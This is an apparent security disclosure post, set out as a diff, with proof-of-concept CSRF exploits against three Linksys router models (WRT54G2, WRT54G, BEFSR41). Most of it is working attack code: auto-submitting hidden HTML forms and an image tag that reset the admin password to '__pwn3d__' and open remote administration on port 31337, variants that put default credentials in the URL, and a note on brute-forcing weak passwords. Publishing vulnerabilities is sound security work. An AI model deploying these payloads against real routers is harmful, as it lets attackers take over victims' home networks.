@@ -1,0 +1,181 @@
+It seems to be fairly well known that there are multiple unpatched
+CSRF vulnerabilities in the administration interfaces for various
+Linksys routers. Since the initial reports of these are from a few
+years ago, and since some exploits are available, I have written
+additional proof of concept exploits for the Linksys routers that I
+have access to.
+
+
+
+While in most cases the victim must be authenticated with the
+application in question to exploit a CSRF vulnerability, since the
+factory default passwords for all of the routers in question are known
+to be admin, the victim does not necessarily need to be authenticated.
+This means that only suggested workaround that I have seen up until
+now, do not surf the web wile authenticated in the router's
+administration interface, does not solve the problem in certain cases
+where the user is still using the default password. This is mitigated
+somewhat by the fact that most browsers provide at least some degree
+of protection from these types of attacks, described in additional
+detail below.
+
+
+
+In each case, the proof of concept will enable remote administration
+of the router on port 31337, while changing the password to __pwn3d__.
+
+
+
+WRT54G2 PoC (tested with hardware version 1.5 and firmware version 1.50):
+
+
+
+<html>
+
+<head>
+
+<title>WRT54G2 CSRF PoC</title>
+
+</head>
+
+<body onload="document.getElementById('F').submit()">
+
+<form action="http://192.168.1.1/Manage.tri"; method="post" id="F">
+
+<input type="hidden" name="MANAGE_USE_HTTP" value="0" />
+
+<input type="hidden" name="MANAGE_HTTP" value="1" />
+
+<input type="hidden" name="MANAGE_HTTP_S" value="0" />
+
+<input type="hidden" name="MANAGE_PASSWORDMOD" value="1" />
+
+<input type="hidden" name="MANAGE_PASSWORD" value="__pwn3d__" />
+
+<input type="hidden" name="MANAGE_PASSWORD_CONFIRM" value="__pwn3d__" />
+
+<input type="hidden" name="_http_enable" value="1" />
+
+<input type="hidden" name="MANAGE_WLFILTER" value="1" />
+
+<input type="hidden" name="MANAGE_REMOTE" value="1" />
+
+<input type="hidden" name="MANAGE_PORT" value="31337" />
+
+<input type="hidden" name="MANAGE_UPNP" value="1" />
+
+<input type="hidden" name="layout" value="en" />
+
+</form>
+
+</body>
+
+</html>
+
+
+
+The form's action can be changed in the following way to attempt to
+log in with the default password:
+
+
+
+<form action="http://a:admin () 192 168 1 1/Manage.tri" method="post" id="F">
+
+
+
+As I mentioned before, success of this type of exploit depends on the
+victim's browser. This is simply blocked in IE8, while Safari will
+give a phishing warning, Firefox warns the user that they are
+attempting to log in with the name "a", and Google Chrome simply
+allows the request without notifying the user in any way.
+
+
+
+WRT54G PoC (tested with hardware version 6 and firmware version 1.02.8):
+
+
+
+<html>
+
+<head>
+
+<title>WRT54G CSRF PoC</title>
+
+</head>
+
+<body onload="document.getElementById('F').submit()">
+
+<form action="http://192.168.1.1/manage.tri"; method="post" id="F">
+
+<input type="hidden" name="remote_mgt_https" value="0" />
+
+<input type="hidden" name="http_enable" value="1" />
+
+<input type="hidden" name="https_enable" value="0" />
+
+<input type="hidden" name="PasswdModify" value="1" />
+
+<input type="hidden" name="http_passwd" value="__pwn3d__" />
+
+<input type="hidden" name="http_passwdConfirm" value="__pwn3d__" />
+
+<input type="hidden" name="_http_enable" value="1" />
+
+<input type="hidden" name="web_wl_filter" value="1" />
+
+<input type="hidden" name="remote_management" value="1" />
+
+<input type="hidden" name="http_wanport" value="31337" />
+
+<input type="hidden" name="upnp_enable" value="1" />
+
+<input type="hidden" name="layout" value="en" />
+
+</form>
+
+</body>
+
+</html>
+
+
+
+To attempt a login with the default password, the same type of
+modification can be made, as shown here:
+
+
+
+<form action="http://a:admin () 192 168 1 1/manage.tri" method="post" id="F">
+
+
+
+BEFSR41 PoC (tested with hardware version 3 and firmware version 1.06.01):
+
+
+
+<img 
+src="http://192.168.1.1/Gozila.cgi?PasswdModify=1&sysPasswd=__pwn3d__&sysPasswdConfirm=__pwn3d__&Remote_Upgrade=1&Remote_Management=1&RemotePort=31337&UPnP_Work=0";
+alt="Nothing to see here." />
+
+
+
+And once again, a modification can be made to attempt to log in with
+the default password, as shown here:
+
+
+
+<img src="http://a:admin () 192 168 1 
+1/Gozila.cgi?PasswdModify=1&sysPasswd=__pwn3d__&sysPasswdConfirm=__pwn3d__&Remote_Upgrade=1&Remote_Management=1&RemotePort=31337&UPnP_Work=0"
+alt="Nothing to see here." />
+
+
+
+It is worth mentioning that even if a user has changed the router's
+password, but is using a weak password, they may still be vulnerable
+to this type of attack. An attacker could simply try many weak
+passwords in a dictionary-style attack. They could also use javascript
+to attempt to brute force the password, provided that they were able
+to get the victim to stay on a page for a reasonably long time.
+
+
+
+-Martin Barbella
